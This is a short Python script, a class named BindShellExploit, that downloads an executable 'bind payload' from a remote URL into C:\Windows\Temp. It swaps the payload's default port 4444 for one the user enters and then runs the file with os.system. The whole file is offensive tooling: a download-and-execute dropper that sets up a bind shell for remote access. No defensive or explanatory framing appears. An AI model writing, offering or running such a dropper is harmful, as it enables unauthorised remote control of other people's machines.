import os
import requests

class BindShellExploit:
    def __init__(self, lport, payload_url, save_path):
        self.lport = lport
        self.payload_url = payload_url
        self.save_path = save_path

    def download_payload(self):
        try:
            response = requests.get(self.payload_url, timeout=10)
            response.raise_for_status()
            with open(self.save_path, 'wb') as file:
                file.write(response.content)
        except requests.RequestException as e:
            print(f"Failed to download payload: {e}")
            exit(1)

    def modify_payload(self):
        # Modify the payload to include the port
        temp_path = self.save_path + ".tmp"
        with open(self.save_path, 'r+b') as f:
            data = f.read()
        with open(temp_path, 'wb') as f:
            f.write(data.replace(b"4444", str(self.lport).encode()))
        os.rename(temp_path, self.save_path)

    def execute_payload(self):
        try:
            os.system(f'"{self.save_path}"')
        except Exception as e:
            print(f"Failed to execute payload: {e}")
            exit(1)

    def execute(self):
        self.download_payload()
        self.modify_payload()
        self.execute_payload()

if __name__ == "__main__":
    # Kullanıcıdan port bilgilerini al
    lport = int(input("Enter LPORT: "))

    # İndirme URL'si ve kaydetme yolu
    payload_url = "http://example.com/bind_payload.exe"
    save_path = "C:\\Windows\\Temp\\bind_payload.exe"

    exploit = BindShellExploit(lport, payload_url, save_path)
    exploit.execute()